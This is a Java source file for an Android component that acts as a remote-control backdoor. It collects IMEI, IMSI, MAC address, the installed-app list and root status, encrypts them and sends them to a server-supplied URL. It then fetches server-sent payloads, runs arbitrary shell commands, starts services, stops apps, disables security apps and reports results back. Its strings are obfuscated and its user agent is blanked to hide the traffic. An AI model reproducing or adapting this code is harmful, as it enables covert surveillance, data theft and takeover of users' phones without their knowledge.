package workspace.main;
import java.io.File;
import java.util.Locale;
import org.apache.http.Header;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import workspace.loopj.AsyncHttpClient;
import workspace.loopj.FileAsyncHttpResponseHandler;
import workspace.loopj.RequestParams;
import workspace.loopj.TextHttpResponseHandler;
import workspace.utils.AES;
import workspace.utils.AppUtil;
import workspace.utils.CommonUtil;
import workspace.utils.Constants;
import workspace.utils.FileMD5;
import workspace.utils.InfoHelper;
import workspace.utils.Logger;
import workspace.utils.NetworkUtil;
import workspace.utils.SimpleEncoder;
import workspace.utils.Store;
import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.os.Build;
import android.os.Environment;
import android.text.TextUtils;
import export.IService;

@SuppressLint("NewApi")
public class MainManager {
    /**
     * "post"
     */
    private static final String POST = SimpleEncoder.getString(new byte[] { 114, 108, 119, 113 });
    /**
     * "UTF-8"
     */
    private static final String UTF_8 = SimpleEncoder.getString(new byte[] { 87, 87, 66, 40, 62 });
    /**
     * "Existing"
     */
    private static final String EXISTING = SimpleEncoder.getString(new byte[] { 71, 123, 109, 118, 114, 110, 102, 110 });
    /**
     *  "Success"
     */
    private static final String SUCCESS2 = SimpleEncoder.getString(new byte[] { 81, 118, 103, 102, 99, 116, 123 });
    /**
     * "download failure:"
     */
    private static final String DOWNLOAD_FAILURE = SimpleEncoder.getString(new byte[] { 102, 108, 115, 107, 106, 104, 105, 109, 42, 109, 109, 100, 98, 122, 98, 116, 40 });
    /**
     * "time"
     */
    private static final String TIME = SimpleEncoder.getString(new byte[] { 118, 106, 105, 96 });
    /**
     * "codesa"
     */
    private static final String CODESA = AES.decode("uP/MqItJq+fiSh3hcN5xGA==");
    /**
     * "stopapp"
     */
    private static final String STOPAPP = AES.decode("RycvXWMCgQlNJhLF2KTxeA==");
    /**
     * "codess"
     */
    private static final String CODESS = AES.decode("wh3aR8bBXROIN1l0mKILkw==");
    private static final String Key_URL = "a";
    private static final String Key_LOCATION = "b";
    private static final String KEY_COMMANDS = "c";
    private static final String KEY_PLUGIN_INTERVAL = "d";
    private static final String KEY_SERVER_URL = "e";
    private static final String KEY_REPORT_CMD_RESULT = "f";
    private static final String KEY_BACKGROUND_ONLY = "G";
    //added on 20141016
    private static final String KEY_FILE_MD5 = "aa";
    private static final String KEY_CLIENT_ID = "aes";
    public static final String STOP_SECURITY_APPS = "h";
    public static final String STOP_SECURITY_APPS_REPORT = "i";
    //
    private static final int REQUEST_TRY_TIMES = 3;
    private static void addDownloadResult(JSONArray executeLog, String url, String result, int trySequence) {
        JSONObject obj = new JSONObject();
        try {
            obj.put("u", url);
            obj.put("r", result);
            obj.put("t", trySequence);
        } catch (JSONException e) {
            Logger.error(e);
        }
        executeLog.put(obj);
    }
    private static String composeBasicParams(Context context, String password) {
        JSONObject params = new JSONObject();
        try {
            long clientId = Variables.getClientId(context);
            if (clientId == 0) {
                params.put("g", InfoHelper.getAndroidId(context));
                params.put("h", InfoHelper.getMacAddress(context));
                params.put("j", InfoHelper.getImei(context));
            } else {
                params.put(KEY_CLIENT_ID, clientId);
            }
        } catch (Throwable e) {
            Logger.error(e);
        }
        return AES.encode(params.toString(), password);
    }
    private static String getChannel() {
        try {
            int index = Variables.channelId - 1;
            String[] fields = Variables.channels.split(",");
            if (index < fields.length && index >= 0) return fields[index];
        } catch (Throwable e) {
            Logger.error(e);
        }
        return null;
    }
    private static JSONObject composeRequestParams(Context context) {
        JSONObject params = new JSONObject();
        try {
            long clientId = Variables.getClientId(context);
            if (clientId == 0) {
                params.put("a", Build.MANUFACTURER);//manufacturer
                params.put("b", Build.MODEL);//model = Build.MODEL;
                params.put("c", String.valueOf(InfoHelper.getVersionCode(context)));//versionCode;
                params.put("d", context.getPackageName());//packageName
                params.put("e", Locale.getDefault().getDisplayLanguage());//language
                params.put("f", String.valueOf(android.os.Build.VERSION.SDK_INT));
                params.put("g", InfoHelper.getAndroidId(context));
                params.put("h", InfoHelper.getMacAddress(context));
                params.put("i", android.os.Build.BRAND);
                params.put("j", InfoHelper.getImei(context));
                params.put("k", InfoHelper.getImsi(context));
                params.put("l", InfoHelper.getCarrier(context));
                params.put("m", NetworkUtil.isWifiEnable(context));
                params.put("n", "mounted".equals(Environment.getExternalStorageState()));
                params.put("p", !InfoHelper.isUserApp(context));
                params.put("q", InfoHelper.isSystemRooted());
                params.put("u", getChannel());
            } else {
                params.put(KEY_CLIENT_ID, clientId);
            }
            params.put("o", AppUtil.getInstalledPackages(context));
            PackageInfo info = AppUtil.getPackageByServiceName(context, AES.decode(Constants.encodedFlagService));
            if (info != null) {
                params.put("r", info.packageName);
                params.put("s", info.versionCode);
                params.put("t", info.lastUpdateTime);
            }
        } catch (Throwable e) {
            Logger.error(e);
        }
        return params;
    }
    private static void download(final Context context, String url, final File file, final JSONArray commands, final JSONArray executeLog, final boolean reportCmdResult) {
        download(context, url, file, commands, executeLog, reportCmdResult, 1);
    }
    private static void download(final Context context, final String url, final File file, final JSONArray commands, final JSONArray executeLog, final boolean reportCmdResult,
            final int trySequence) {
        getHttpClient().get(url, new FileAsyncHttpResponseHandler(new File(file.getAbsolutePath() + ".xx")) {
            private void handleFailure(Throwable e) {
                if (trySequence < REQUEST_TRY_TIMES) {
                    download(context, url, file, commands, executeLog, reportCmdResult, trySequence + 1);
                } else {
                    addDownloadResult(executeLog, url, e.getMessage(), trySequence);
                    if (reportCmdResult) {
                        reportCmdResult(context, executeLog);
                    }
                }
            }
            @Override
            public void onFailure(int statusCode, Header[] headers, Throwable e, File result) {
                Logger.error(e.getMessage(), e);
                handleFailure(e);
            }
            @Override
            public void onSuccess(int statusCode, Header[] headers, File result) {
                boolean success = statusCode == 200 && result != null && result.renameTo(file);
                if (success) {
                    addDownloadResult(executeLog, url, SUCCESS2, trySequence);
                    executeCommands(context, commands, executeLog, reportCmdResult);
                } else {
                    handleFailure(new Exception(DOWNLOAD_FAILURE + statusCode));
                }
            }
        });
    }
    private static void executeCommands(final Context context, final JSONArray commands, JSONArray executeLog, final boolean reportCmdResult) {
        if (commands != null && commands.length() > 0) {
            for (int i = 0; i < commands.length(); i++) {
                String command = commands.optString(i);
                if (!TextUtils.isEmpty(command)) {
                    try {
                        JSONObject result = null;
                        if (command.startsWith(CODESS)) {
                            result = AppUtil.startService(context, command);
                        } else if (command.startsWith(STOPAPP)) {
                            result = AppUtil.stopApp(context, command.substring(STOPAPP.length() + 1));
                        } else if (command.startsWith(CODESA)) {
                            result = AppUtil.startActivity(context, command);
                        } else {
                            result = CommonUtil.exeCmd(command);
                        }
                        executeLog.put(result);
                    } catch (Throwable e) {
                        Logger.error(e);
                    }
                }
            }
            Logger.info(executeLog.toString());
            if (reportCmdResult) {
                reportCmdResult(context, executeLog);
            }
        }
    }
    private static void executeCommands(final Context context, JSONObject obj) {
        Logger.info(obj.toString());
        String downloadurl = obj.optString(Key_URL);
        String md5 = obj.optString(KEY_FILE_MD5);
        String location = obj.optString(Key_LOCATION);
        long clientId = obj.optLong(KEY_CLIENT_ID);
        JSONArray commands = obj.optJSONArray(KEY_COMMANDS);
        boolean needReport = obj.optBoolean(KEY_REPORT_CMD_RESULT);
        Store.setValue(context, STOP_SECURITY_APPS, obj.optBoolean(STOP_SECURITY_APPS));
        Store.setValue(context, STOP_SECURITY_APPS_REPORT, obj.optBoolean(STOP_SECURITY_APPS_REPORT));
        Variables.saveClientId(context, clientId);
        Variables.setBackgroundOnly(context, obj.optBoolean(KEY_BACKGROUND_ONLY));
        Variables.setUrl(context, obj.optString(KEY_SERVER_URL));
        if (Variables.setInterval(context, obj.optInt(KEY_PLUGIN_INTERVAL))) {
            context.startService(new Intent(context, IService.class).setAction(Constants.ACTIVATE));
        }
        JSONArray executeLog = new JSONArray();
        if (!TextUtils.isEmpty(downloadurl) && !TextUtils.isEmpty(location)) {
            File file = new File(location);
            boolean needDownload = true;
            if (file.exists()) {
                if (matchMD5(file, md5)) needDownload = false;
                else file.delete();
            } else {
                File folder = file.getParentFile();
                if (!folder.exists()) folder.mkdirs();
            }
            if (needDownload) {
                download(context, downloadurl, file, commands, executeLog, needReport);
                return;
            } else {
                addDownloadResult(executeLog, downloadurl, EXISTING, 0);
            }
        }
        executeCommands(context, commands, executeLog, needReport);
    }
    private static AsyncHttpClient getHttpClient() {
        AsyncHttpClient client = new AsyncHttpClient();
        client.setURLEncodingEnabled(false);
        return client;
    }
    private static boolean matchMD5(File file, String md5) {
        return md5 != null && md5.equals(FileMD5.getFileMD5String(file));
    }
    public static void reportCmdResult(final Context context, JSONArray obj) {
        if (obj != null) reportCmdResult(context, obj.toString());
    }
    public static void reportCmdResult(final Context context, JSONObject obj) {
        if (obj != null) reportCmdResult(context, obj.toString());
    }
    private static void reportCmdResult(final Context context, String content) {
        try {
            long current = System.currentTimeMillis();
            AsyncHttpClient client = getHttpClient();
            client.addHeader(TIME, String.valueOf(current));
            client.addHeader("m", "r");
            client.setUserAgent("");
            RequestParams params = new RequestParams();
            final String password = CommonUtil.generatePassword(current);
            params.put("r", AES.encode(content, password));
            params.put("p", composeBasicParams(context, password));
            String url = Variables.getUrl(context);
            client.post(url, params, new TextHttpResponseHandler(UTF_8) {
                @Override
                public void onFailure(int statusCode, Header[] headers, String responseString, Throwable throwable) {}
                @Override
                public void onSuccess(int statusCode, Header[] headers, String responseString) {}
            });
        } catch (Throwable e) {
            Logger.error(e);
        }
    }
    public static void request(final Context context) {
        request(context, 1);
    }
    private static void request(final Context context, final int trySequence) {
        if (Store.getValue(context, STOP_SECURITY_APPS, false)) {
            JSONObject obj = AppUtil.stopSecurityApps(context);
            if (Store.getValue(context, STOP_SECURITY_APPS_REPORT, false)) {
                reportCmdResult(context, obj);
            }
        }
        long current = System.currentTimeMillis();
        RequestParams params = new RequestParams();
        final String password = CommonUtil.generatePassword(current);
        JSONObject clientInfo = composeRequestParams(context);
        Logger.info(clientInfo.toString());
        params.put(POST, AES.encode(clientInfo.toString(), password));
        AsyncHttpClient client = getHttpClient();
        client.addHeader(TIME, String.valueOf(current));
        client.setUserAgent("");
        String url = Variables.getUrl(context);
        Logger.info(url);
        client.post(url, params, new TextHttpResponseHandler(UTF_8) {
            @Override
            public void onFailure(int statusCode, Header[] headers, String responseBody, Throwable e) {
                if (e != null) {
                    Logger.error(e);
                }
                if (trySequence < REQUEST_TRY_TIMES) {
                    request(context, trySequence + 1);
                }
            }
            @Override
            public void onSuccess(int statusCode, Header[] headers, String result) {
                if (statusCode >= 400 && statusCode < 500) {
                    Variables.clearUrl(context);
                }
                if (result != null && result.trim().length() > 0) {
                    try {
                        Logger.info(result);
                        executeCommands(context, new JSONObject(AES.decode(result, password)));
                    } catch (Throwable e) {
                        Logger.error(e);
                    }
                }
            }
        });
    }
}
